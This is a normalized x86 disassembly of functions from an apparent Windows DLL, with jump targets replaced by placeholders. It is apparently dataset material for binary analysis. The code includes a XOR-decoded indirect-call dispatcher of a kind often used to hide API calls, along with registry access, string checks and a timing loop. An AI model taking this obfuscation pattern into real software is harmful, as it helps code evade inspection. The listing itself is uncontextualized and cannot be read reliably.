xor [ ebp + 0xb ] bl
lea eax [ edi - 0x1 ]
cmp eax 0x11
ja r-xdata
cmp edi 0x6
je r-xdata
jmp [ eax * 4 + jump_table_1005cbd8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
call [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov ecx [ esi + 0x24 ]
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x1c ]
push ecx
mov ecx [ esi + 0x18 ]
push edx
mov edx [ esi + 0x14 ]
push eax
mov eax [ esi + 0x10 ]
push ecx
mov ecx [ esi + 0xc ]
push edx
push eax
push ecx
call [ ebp + 0x8 ]
jmp r-xdata
mov edx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x14 ]
push edx
mov edx [ esi + 0x10 ]
push eax
mov eax [ esi + 0xc ]
push ecx
push edx
push eax
call [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
push ecx
jmp r-xdata
mov edx [ esi + 0xc ]
push edx
mov [ esi + 0x8 ] 0x0
call [ ebp + 0x8 ]
jmp r-xdata
call [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
push eax
push ecx
call [ ebp + 0x8 ]
jmp r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x18 ]
push edx
mov edx [ esi + 0x14 ]
push eax
mov eax [ esi + 0x10 ]
push ecx
mov ecx [ esi + 0xc ]
push edx
push eax
push ecx
call [ ebp + 0x8 ]
jmp r-xdata
mov edx [ esi + 0x34 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x2c ]
push edx
mov edx [ esi + 0x28 ]
push eax
mov eax [ esi + 0x24 ]
push ecx
mov ecx [ esi + 0x20 ]
push edx
mov edx [ esi + 0x1c ]
push eax
mov eax [ esi + 0x18 ]
push ecx
mov ecx [ esi + 0x14 ]
push edx
movzx edx [ esi + 0x10 ]
push eax
mov eax [ esi + 0xc ]
push ecx
push edx
push eax
call [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x10 ]
push ecx
mov ecx [ esi + 0xc ]
push edx
push eax
push ecx
call [ ebp + 0x8 ]
jmp r-xdata
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
push edx
push eax
call [ ebp + 0x8 ]
jmp r-xdata
mov edx [ esi + 0xc ]
push edx
mov [ esi + 0x8 ] eax
call [ ebp + 0x8 ]
sub_1005cc50
push ebp
mov ebp esp
sub esp 0x6b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6ac ] edi
mov [ ebp - 0x6b0 ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x1
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
push ebx
lea edx [ ebp - 0x6a8 ]
mov eax 0x1
call sub_1000a460
lea edx [ ebp - 0x6a4 ]
mov eax 0x2
call sub_1000a460
lea edx [ ebp - 0x6a0 ]
xor eax eax
call sub_1000a460
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a4 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
mov edi [ ebp - 0x6ac ]
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x6a8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_1003d910
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x84 ]
mov eax 0x4
call sub_1000a460
mov edx [ ebp - 0x6b0 ]
push 0x1
push edx
lea ecx [ ebp - 0x69c ]
lea eax [ ebp - 0x84 ]
mov edx 0x80000002
call sub_10016580
add esp 0x8
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1005cfc3
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1005d04d
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1005d0d7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call sub_1002a5ec
test al al
je r-xdata
push r--data
call sub_1002c5ed
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_1001e0aa
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1005d130
push ebp
mov ebp esp
mov eax [ edi + 0x10 ]
push ebx
push esi
cmp eax 0x1
jb r-xdata
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
dec eax
cmp eax 0xffffffff
jbe r-xdata
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx edi
call sub_1000a770
cmp esi eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
push ecx
push esi
call sub_10050b90
add esp 0xc
test eax eax
je r-xdata
lea esi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov bl [ eax ]
mov edi edi
dec esi
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ esi ] bl
jne r-xdata
mov eax esi
mov ecx edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
mov ecx [ edi ]
mov eax esi
pop esi
sub eax ecx
pop ebx
pop ebp
retn 0x4
sub_1005d1b0
push ebp
mov ebp esp
push esi
push edi
mov edi eax
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0x8 ] edi
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebx + edi * 4 ] ecx
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
pop edi
pop esi
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov [ ebx + edi * 4 ] eax
lea eax [ esi - 0x1 ]
cdq
sub eax edx
mov edi esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0x8 ] edi
jl r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebx + edi * 4 ] edx
pop edi
pop esi
pop ebp
retn
sub_1005d250
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_100796a0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_1005d289
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
call sub_1006a508
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x8
push eax
call sub_10065abd
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add esi 0x2
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_100078a8
fld [ eax + 0x10 ]
add esp 0xc
cmp [ ebp - 0x20 ] 0x0
je r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10024145
leave
retn
mov eax [ ebp - 0x24 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1005d320
push ebp
mov ebp esp
push 0xffffffff
push sub_10080db0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_1006b4d0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_1003a1e0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_10011560
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x14
sub_1005d450
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
xor edi edi
mov ecx ebx
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
call sub_10020a20
fldz
fstp [ esi + 0x10 ]
mov [ esi ] r--data
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x8
call sub_100050e0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x24 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x24 ]
push ecx
push edi
push eax
mov [ esi + 0xc ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
fld [ ebx + 0x10 ]
mov ecx [ ebp - 0x4 ]
fstp [ esi + 0x10 ]
mov edx [ ebx + 0x18 ]
pop edi
mov [ esi + 0x18 ] edx
mov eax esi
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1005d500
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x3
cmp eax 0x1ffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_1002c5ed
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10033080
mov edx eax
cmp edx eax
jae r-xdata
sub_1005d550
push ebp
mov ebp esp
sub esp 0x8
lea eax [ ebp - 0x4 ]
push eax
push ecx
push esi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
call sub_100041d0
push esi
test eax eax
je r-xdata
call [ LocalFree@IAT ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ rw-data ]
push 0x0
push edx
push eax
push ecx
xor edx edx
xor ecx ecx
call sub_10009050
test eax eax
je r-xdata
call [ LocalFree@IAT ]
mov eax 0x1
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x2
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005d5e0
push ebp
mov ebp esp
push 0xffffffff
push sub_100834b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x198
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0x8 ]
mov edi [ ebx + 0xb0 ]
mov [ ebp - 0x1a0 ] ecx
lea ecx [ ebx + 0xa0 ]
mov [ ebp - 0x198 ] eax
mov [ ebp - 0x180 ] ecx
mov eax edi
jb r-xdata
xor esi esi
push esi
push r--data
push ecx
call sub_10050b90
add esp 0xc
cmp eax esi
jne r-xdata
mov ecx [ ecx ]
sete al
test al al
je r-xdata
xor eax eax
cmp edi esi
setne al
cmp eax esi
cmp [ ebx ] 0x0
jne r-xdata
mov eax 0x44
jmp r-xdata
push esi
push r--data
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x134 ] 0xf
mov [ ebp - 0x138 ] esi
mov [ ebp - 0x148 ] 0x0
call sub_10043190
mov edi ebx
mov [ ebp - 0x4 ] esi
call sub_100010b0
mov [ ebp - 0x16c ] eax
cmp eax esi
je r-xdata
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x148 ]
call sub_10061060
mov eax 0x43
jmp r-xdata
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x190 ] esi
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x4 ] 0x1
mov edi [ GetTickCount@IAT ]
call edi
mov ecx [ ebp - 0x180 ]
lea edx [ ebp - 0x148 ]
mov esi eax
mov eax [ ebp - 0x16c ]
push edx
push eax
lea edx [ ebp - 0x194 ]
call sub_1000ef10
mov [ ebp - 0x184 ] eax
call edi
sub eax esi
mov [ ebp - 0x178 ] eax
fild [ ebp - 0x178 ]
jns r-xdata
fmul [ ebx + 0x118 ]
fnstcw [ ebp - 0x166 ]
movzx eax [ ebp - 0x166 ]
or eax 0xc00
mov [ ebp - 0x178 ] eax
fldcw [ ebp - 0x178 ]
fistp [ ebp - 0x17c ]
mov ecx [ ebp - 0x17c ]
push ecx
fldcw [ ebp - 0x166 ]
call [ Sleep@IAT ]
mov eax [ ebp - 0x184 ]
cmp eax 0x42
je r-xdata
fadd [ r--data ]
mov ecx [ ebp - 0x16c ]
mov [ ecx + 0xd4 ] 0x0
jmp r-xdata
cmp eax 0x43
je r-xdata
lea esi [ ebp - 0x194 ]
call sub_10061020
mov edx [ ebp - 0x16c ]
mov [ edx + 0xd4 ] 0x0
mov ecx [ ebp - 0x190 ]
mov edi [ ebp - 0x194 ]
test eax eax
jne r-xdata
sub ecx edi
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
mov [ ebp - 0x168 ] 0x0
mov [ ebp - 0x170 ] esi
je r-xdata
mov esi ecx
sub esi edi
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
lea esi [ ebp - 0x194 ]
mov [ ebp - 0x4 ] 0x0
call sub_10061020
cmp [ ebp - 0x184 ] 0x4
je r-xdata
jmp r-xdata
cmp [ ebp - 0x134 ] 0x10
mov eax [ ebp - 0x148 ]
mov [ ebp - 0x138 ] 0x0
jae r-xdata
lea esi [ ebp - 0x34 ]
call sub_10027260
lea ecx [ ebx + 0x11c ]
push eax
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x178 ] ecx
call sub_10036380
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10029c40
mov eax [ ebx + 0xc4 ]
mov edx [ ebx + 0xc8 ]
lea esi [ ebx + 0xc4 ]
sub edx eax
xor ecx ecx
sar edx 0x2
mov [ ebp - 0x170 ] ecx
mov [ ebp - 0x168 ] esi
test edx edx
je r-xdata
xor esi esi
jmp r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov [ eax ] 0x0
lea eax [ ebp - 0x148 ]
lea ecx [ ebp - 0x148 ]
call sub_10061060
xor eax eax
lea ecx [ ecx ]
mov eax [ ebp - 0x168 ]
inc eax
add edi 0x3c
mov [ ebp - 0x168 ] eax
cmp eax esi
jb r-xdata
mov edx edi
mov ecx ebx
call sub_1001d1a0
mov [ ebp - 0x178 ] eax
test eax eax
js r-xdata
lea edi [ ecx * 4 ]
mov ecx [ ebx + 0xc4 ]
mov eax [ edi + ecx ]
mov edx [ eax + 0x48 ]
mov eax [ eax + 0x40 ]
mov ecx [ ebp - 0x1a0 ]
lea esi [ ebx + 0xc4 ]
push edx
push eax
push ebx
mov ebx [ ebp - 0x198 ]
call sub_1003bb80
lea edx [ ebp - 0x38 ]
mov eax 0x9
call sub_10060ac0
mov ecx [ esi ]
mov eax [ edi + ecx ]
test eax eax
je r-xdata
lea edx [ ebp - 0x12c ]
mov eax 0x5
call sub_10060ac0
mov eax edx
push eax
lea ecx [ ebp - 0x34 ]
call sub_10012920
mov [ ebp - 0x4 ] 0x8
mov ecx [ esi ]
mov ecx [ edi + ecx ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0x34 ]
push edx
lea ecx [ ecx + 0x7c ]
call sub_10019180
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call sub_10029c40
lea esi [ ebp - 0x34 ]
call sub_10027260
mov ecx [ ebp - 0x178 ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10036380
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10029c40
mov eax [ ebp - 0x168 ]
mov eax [ eax ]
mov ecx [ eax + edi ]
push ecx
lea esi [ ebp - 0x34 ]
call sub_10019b20
mov edx [ ebp - 0x180 ]
push edx
mov edx [ ebp - 0x16c ]
mov ecx eax
mov [ ebp - 0x4 ] 0xa
call sub_100385a0
lea ecx [ ebp - 0x34 ]
mov esi eax
mov [ ebp - 0x4 ] 0x0
call sub_10061060
cmp esi 0x43
je r-xdata
mov eax [ edi ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10062430
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x2
call sub_10035d20
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10061060
lea edx [ ebp - 0x50 ]
mov eax 0x12
call sub_10060ac0
mov ecx edx
push ecx
lea ecx [ ebp - 0x164 ]
call sub_10012920
mov esi [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
mov edx [ ebx + 0xc4 ]
push 0xffffffff
add esi esi
add esi esi
mov eax [ esi + edx ]
push 0x0
lea ecx [ ebp - 0x164 ]
push ecx
lea ecx [ eax + 0x60 ]
call sub_10019180
lea ecx [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0x1
call sub_10029c40
mov edx [ ebx + 0xc4 ]
mov eax [ esi + edx ]
mov ecx [ eax + 0x44 ]
cmp ecx [ eax + 0x48 ]
jne r-xdata
mov eax [ esi ]
add eax edi
push eax
lea edi [ ebp - 0x19c ]
call sub_10015500
lea ecx [ ebp - 0x148 ]
call sub_10061060
mov eax 0x1
jmp r-xdata
call sub_10007480
mov eax [ ebp - 0x16c ]
mov [ eax + 0xd4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0xbc ]
mov eax 0x22
call sub_10060ac0
mov esi [ ebp - 0x168 ]
mov eax [ esi ]
mov eax [ edi + eax ]
test eax eax
je r-xdata
mov esi [ ebp - 0x170 ]
lea edx [ ebp - 0x160 ]
mov eax 0x58
call sub_10060ac0
push edx
lea ecx [ ebp - 0x34 ]
call sub_10012920
mov [ ebp - 0x4 ] 0x4
mov eax [ ebx + 0xc4 ]
mov eax [ esi + eax ]
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ eax + 0x60 ]
call sub_10019180
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_10029c40
mov eax [ ebx + 0xc4 ]
mov edx [ eax + esi ]
push edx
lea esi [ ebp - 0x34 ]
call sub_10019b20
mov ecx [ ebp - 0x180 ]
mov edx [ ebp - 0x16c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x5
call sub_1001a8c0
lea ecx [ ebp - 0x34 ]
mov esi eax
mov [ ebp - 0x4 ] 0x1
call sub_10061060
cmp esi 0x43
je r-xdata
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10061060
xor esi esi
jmp r-xdata
add edi [ esi ]
push edi
lea edi [ ebp - 0x19c ]
call sub_10015500
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx [ ebp - 0x170 ]
sub edx eax
inc ecx
sar edx 0x2
mov [ ebp - 0x170 ] ecx
cmp ecx edx
jae r-xdata
call sub_10007480
lea edx [ ebp - 0x9c ]
mov eax 0x44
call sub_10060ac0
push edx
lea ecx [ ebp - 0x34 ]
call sub_10012920
mov ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ebx + 0xc4 ]
mov ecx [ eax + ecx * 4 ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0x34 ]
push edx
lea ecx [ ecx + 0x7c ]
call sub_10019180
lea ecx [ ebp - 0x34 ]
call sub_10029c40
mov eax [ ebp - 0x16c ]
mov [ eax + 0xd4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x1f
call sub_10060ac0
jmp r-xdata
lea edi [ ecx * 4 ]
mov eax [ edi + eax ]
mov edx [ eax + 0x44 ]
cmp edx [ eax + 0x48 ]
je r-xdata
sub_1005dc2a
mov edi edi
push esi
call sub_10029ea7
mov esi eax
push esi
call sub_10019b4e
push esi
call sub_10027d92
push esi
call sub_1004d501
push esi
call sub_10057674
push esi
call sub_100188fe
push esi
call sub_1006590e
add esp 0x18
pop esi
retn
sub_1005dc5d
push 0x4
mov eax sub_1007f289
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100014b7
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_10022b5a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_10050f50
call sub_1004db01
retn
mov ecx [ eax ]
